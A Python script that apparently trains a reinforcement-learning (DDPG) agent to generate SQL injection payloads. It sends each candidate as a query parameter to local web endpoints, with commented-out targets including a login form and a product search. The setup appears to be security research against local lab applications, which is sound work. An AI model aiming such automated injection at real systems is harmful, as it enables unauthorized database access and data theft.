#!/usr/local/bin/python
import numpy as np
import requests
from sql_parser.token_parser import TokenParser
from sql_parser.sql_data_service import SQLDataService
from rl.ddpg import DDPG
from rl.environment import Environment

ACTION_SIZE = 40
STATE_SIZE = 500

IP = '127.0.0.1'

# Skips lowercase alphabet as SQL is case-insensitive.
visible_uppercase_chars = [chr(i) for i in range(32, 97)] + \
    [chr(i) for i in range(123, 128)]

data_service = SQLDataService()

columns = data_service.load_columns()
tables = data_service.load_tables()

sql_tokens = data_service.load_sql_tokens()
token_blacklist = data_service.load_sql_blacklist()

payloads = data_service.load_payload_files(IP)

dictionary = sql_tokens + tables + columns + visible_uppercase_chars

# Remove duplicate characters. For example, visible_uppercase_chars might contain '(',
# which may also be contained in sql_tokens.
dictionary = list(set(dictionary))

dictionary.sort(reverse=True)

print('Encoding payloads...')
encoded_payloads = TokenParser(dictionary, token_blacklist, payloads).parse()
print(f'{len(encoded_payloads)} payload(s) encoded.')

environment = Environment(
    dictionary, action_size=ACTION_SIZE, state_size=STATE_SIZE,
    encoded_payloads=encoded_payloads,
    columns=columns, tables=tables,
    send_request_callback= lambda payload:
        requests.get(f'http://{IP}:5000/comments_single_column?score={payload}'))
        #requests.post(f'http://localhost:3000/rest/product/search',data={'q': payload})
        #requests.post('http://localhost:3000/rest/user/login', data={
        #    'email': payload
        #})
        # requests.get(f'http://127.0.0.1:5000/pages?prodLine={payload}')
                                         
state: np.ndarray

def print_decoded_injections():
    '''
    Use to verify that the predefined encoded injection list is correctly
    encoded.
    '''
    for injection in encoded_payloads:
        decoded = [dictionary[i] for i in injection]
        print(''.join(decoded))

def main():
    ddpg = DDPG(environment)
    ddpg.run(total_demonstration_steps=1000)

if __name__ == '__main__':
    main()